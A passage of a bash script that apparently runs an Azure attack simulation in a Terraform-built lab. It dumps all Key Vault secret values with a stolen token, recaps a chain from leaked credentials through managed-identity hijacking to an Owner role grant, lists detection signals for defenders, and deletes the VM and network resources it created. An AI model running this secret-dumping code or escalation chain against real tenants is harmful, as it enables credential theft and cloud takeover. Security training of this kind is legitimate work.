SECRETS_JSON="$(curl -sS -H "Authorization: Bearer $VAULT_TOKEN" \
  "${VAULT_URI}secrets?api-version=7.4")"

spin_stop

if echo "$SECRETS_JSON" | jq -e '.error' >/dev/null 2>&1; then
  msg="$(echo "$SECRETS_JSON" | jq -r '.error.message')"
  err "Failed to list secrets: $msg"
  info "RBAC propagation may take a few minutes. Try running again."
  exit 1
fi

SECRET_COUNT="$(echo "$SECRETS_JSON" | jq '.value | length')"
ok "Found ${SECRET_COUNT} secrets"

step "Exfiltrating secret values"

SECRET_NAMES=($(echo "$SECRETS_JSON" | jq -r '.value[].id' | xargs -n1 basename))

printf "\n%s%s%s\n" "${BOLD}${RED}" "=== EXFILTRATED SECRETS ===" "${RESET}"

for secret_name in "${SECRET_NAMES[@]}"; do
  spin_start "Reading secret: ${secret_name}"
  
  SECRET_VALUE_JSON="$(curl -sS -H "Authorization: Bearer $VAULT_TOKEN" \
    "${VAULT_URI}secrets/${secret_name}?api-version=7.4")"
  
  spin_stop
  
  if echo "$SECRET_VALUE_JSON" | jq -e '.value' >/dev/null 2>&1; then
    value="$(echo "$SECRET_VALUE_JSON" | jq -r '.value')"
    printf "\n  %s%s%s:\n" "$YELLOW" "$secret_name" "$RESET"
    printf "  %s%s%s\n" "$MAGENTA" "$value" "$RESET"
  fi
done

#############################################
# Cleanup
#############################################
step "Cleaning up temporary SSH keys"
rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
ok "SSH keys removed"

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Authenticated using leaked App Registration credentials\n"
printf "  2. Discovered accessible subscription and enumerated resources\n"
printf "  3. Discovered overprivileged User-Assigned Managed Identity\n"
printf "  4. Deployed rogue VM with UAMI attached (identity hijacking)\n"
printf "  5. Used UAMI to grant Owner role on Resource Group to leaked SP\n"
printf "  6. Accessed Key Vault and exfiltrated sensitive secrets\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Complete Resource Group takeover (Owner role)\n"
printf "  • Sensitive secrets exfiltrated from Key Vault\n"
printf "  • Full control over all resources in the RG\n"
printf "  • Persistence via additional role assignments or backdoor VMs\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • App Registration authentication from unusual locations\n"
printf "  • VM deployments with User-Assigned Managed Identities\n"
printf "  • Role assignment creations, especially Owner/User Access Admin\n"
printf "  • Key Vault access from unexpected principals\n"
printf "  • IMDS token requests for specific client_ids\n"

################################################################################
# Cleanup Attack Resources
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Cleanup Attack-Created Resources  ===" "${RESET}"

printf "\nThe attack created the following resources that are NOT managed by Terraform:\n"
printf "  • Virtual Machine: %s%s%s\n" "$YELLOW" "$VM_NAME" "$RESET"
printf "  • Virtual Network: %s%s%s\n" "$YELLOW" "$VNET_NAME" "$RESET"
printf "  • Network Security Group: %s%s%s\n" "$YELLOW" "$NSG_NAME" "$RESET"
printf "  • Network Interface: %s%s%s\n" "$YELLOW" "$NIC_NAME" "$RESET"
printf "  • Public IP: %s%s%s\n" "$YELLOW" "$PIP_NAME" "$RESET"
printf "  • OS Disk (auto-created)\n\n"

printf "%sThese must be deleted before running 'terraform destroy'.%s\n\n" "$RED" "$RESET"

read -r -p "Do you want to delete these resources now? [y/N]: " CLEANUP_CONFIRM

if [[ "$CLEANUP_CONFIRM" =~ ^[Yy]$ ]]; then
  step "Deleting attack-created resources"
  
  # Delete VM first (releases NIC and creates orphan disk)
  spin_start "Deleting Virtual Machine: $VM_NAME"
  curl -sS -X DELETE \
    -H "Authorization: Bearer $AZURE_TOKEN" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/virtualMachines/${VM_NAME}?api-version=2023-07-01" >/dev/null
  sleep 30
  spin_stop
  ok "VM deleted"
  
  # Delete the OS disk (named after VM)
  spin_start "Deleting OS Disk"
  # List disks and find the one matching our VM name
  DISKS_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/disks?api-version=2023-04-02")"
  DISK_NAME="$(echo "$DISKS_JSON" | jq -r --arg VM "$VM_NAME" '.value[] | select(.name | startswith($VM)) | .name')"
  if [ -n "$DISK_NAME" ] && [ "$DISK_NAME" != "null" ]; then
    curl -sS -X DELETE \
      -H "Authorization: Bearer $AZURE_TOKEN" \
      "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/disks/${DISK_NAME}?api-version=2023-04-02" >/dev/null
    sleep 10
  fi
  spin_stop
  ok "OS Disk deleted"
  
  # Delete NIC
  spin_start "Deleting Network Interface: $NIC_NAME"
  curl -sS -X DELETE \
    -H "Authorization: Bearer $AZURE_TOKEN" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/networkInterfaces/${NIC_NAME}?api-version=2023-05-01" >/dev/null
  sleep 10
  spin_stop
  ok "NIC deleted"
  
  # Delete Public IP
  spin_start "Deleting Public IP: $PIP_NAME"
  curl -sS -X DELETE \
    -H "Authorization: Bearer $AZURE_TOKEN" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/publicIPAddresses/${PIP_NAME}?api-version=2023-05-01" >/dev/null
  sleep 10
  spin_stop
  ok "Public IP deleted"
  
  # Delete NSG
  spin_start "Deleting Network Security Group: $NSG_NAME"
  curl -sS -X DELETE \
    -H "Authorization: Bearer $AZURE_TOKEN" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/networkSecurityGroups/${NSG_NAME}?api-version=2023-05-01" >/dev/null
  sleep 10
  spin_stop
  ok "NSG deleted"
  
  # Delete VNet
  spin_start "Deleting Virtual Network: $VNET_NAME"
  curl -sS -X DELETE \
    -H "Authorization: Bearer $AZURE_TOKEN" \
    "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Network/virtualNetworks/${VNET_NAME}?api-version=2023-05-01" >/dev/null
  sleep 10
  spin_stop
  ok "VNet deleted"
  
  printf "\n%s%s%s\n" "${GREEN}" "All attack resources cleaned up. You can now run 'terraform destroy'." "${RESET}"
else
  printf "\n%sSkipping cleanup.%s To delete manually, run:\n" "$YELLOW" "$RESET"
  printf "  az vm delete -g %s -n %s --yes --force-deletion\n" "$RESOURCE_GROUP" "$VM_NAME"
  printf "  az network nic delete -g %s -n %s\n" "$RESOURCE_GROUP" "$NIC_NAME"
  printf "  az network public-ip delete -g %s -n %s\n" "$RESOURCE_GROUP" "$PIP_NAME"
  printf "  az network nsg delete -g %s -n %s\n" "$RESOURCE_GROUP" "$NSG_NAME"
  printf "  az network vnet delete -g %s -n %s\n" "$RESOURCE_GROUP" "$VNET_NAME"
  printf "\nOr set 'prevent_deletion_if_contains_resources = false' in Terraform provider.\n"
fi
